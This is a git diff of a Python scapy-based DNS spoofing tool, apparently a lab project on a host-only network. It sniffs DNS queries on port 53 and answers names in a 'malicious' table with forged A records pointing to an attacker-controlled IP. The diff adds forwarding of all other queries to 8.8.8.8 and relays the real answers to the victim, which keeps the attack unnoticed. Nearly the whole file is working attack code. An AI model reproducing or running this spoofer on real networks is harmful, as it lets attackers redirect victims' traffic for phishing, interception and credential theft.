@@ -1,4 +1,6 @@
 from struct import pack
+from turtle import forward
+from urllib import response
 from scapy.all import DNS, UDP, IP, DNSRR, DNSQR , sr1, send, sniff
 from scapy.layers.l2 import Ether
 # from netfilterqueue import NetfilterQueue
@@ -12,12 +14,15 @@ class DNSSpoof:
 		self,
 		net_interface: InterfaceConfig,
 		forward: bool = False,
-		mal_dns_table={},
+		forward_address: str = "8.8.8.8", # we'll use google's DNS
+		mal_dns_table ={},
 	) -> None:
 
 		self.BPF = "udp port 53"
 		self.NET_INTERFACE = net_interface
 		self.mal_dns_table = mal_dns_table
+		self.forward = forward
+		self.forward_address = forward_address
 
 	def query_user(self):
 		pass
@@ -56,17 +61,50 @@ class DNSSpoof:
 		if queried_name in self.mal_dns_table:
 			
 			reply = self.spoof_packet(queried_name, packet)
-			print(f"AFTER: \n\n  {reply.show()}")
 			send(reply)
-		else:
-			self.forward_packet(queried_name, packet)
+		elif self.forward:
+			reply = self.forward_packet(queried_name, packet)
+
+			if not reply:
+				return
+			
+			# reply to victim
+			legit_reply = IP()/ UDP() / reply[DNS]
+			legit_reply[IP].src = packet[IP].dst
+			legit_reply[IP].dst = packet[IP].src
+			legit_reply[UDP].sport = packet[IP].dport
+			legit_reply[UDP].dport = packet[IP].sport
+
+			send(legit_reply)
+
+
 
 	def forward_packet(self, query: str, packet: Ether):
 		print(f"[FORWARDING]: {packet.summary()}\n")
 
+		forwarded_packet = IP() / UDP() / packet[DNS]
+		# change source  and dest IP addr
+		forwarded_packet[IP].src = self.NET_INTERFACE.IP_ADDR
+		forwarded_packet[IP].dst = self.forward_address # 8.8.8.8
+		# change source/dest ports
+		forwarded_packet[UDP].sport = 4500 # random? change?
+		forwarded_packet[UDP].dport = 53 # standard DNS port
+
+		# retry a bit until there's a respobse
+		for _ in range(4):
+			# capture the legit response from teh DNS req
+			legit_response = sr1(forwarded_packet, timeout=2)
+			if legit_response:
+				print(f"[FORWARDING] Forwarded packet successfully")
+				return legit_response
+		
+		print(f"[INFO] Failed to forward packet: {packet.summary()}\n")
+		return None
+
+
 	def spoof_packet(self, query: str, packet: Ether):
 		print(f"[SPOOFING]: Packet {packet.summary()}\n")
-		print(f"\tBefore: \n {packet.show()}")
+		print(f"\t[SPOOFING] Before: \n {packet.show()}")
 
 		spoofed_ip = self.mal_dns_table[query]
 
@@ -87,6 +125,8 @@ class DNSSpoof:
 		spoofed_reply[DNS].an = DNSRR(rrname=query+'.', rdata=spoofed_ip, type="A", rclass="IN")
 
 		# print(spoofed_reply.summary())
+		print(f"\t[SPOOFING] AFTER: \n\n  {spoofed_reply.show()}")
+
 		return spoofed_reply
 
 
@@ -96,9 +136,9 @@ if __name__ == "__main__":
 	print("Running...")
 
 	interface_config = InterfaceConfig("eth0", "08:00:27:95:bd:54",
-									   "192.168.56.169")
+										 "192.168.56.169")
 
-	dns_att = DNSSpoof(net_interface= interface_config, mal_dns_table= {
+	dns_att = DNSSpoof(net_interface= interface_config, forward=True, mal_dns_table= {
 		"muievladimir2.com": "192.168.56.102",
 		"www.muie.com": "192.168.56.102",
 		"www.muie2.com": "192.168.56.102",
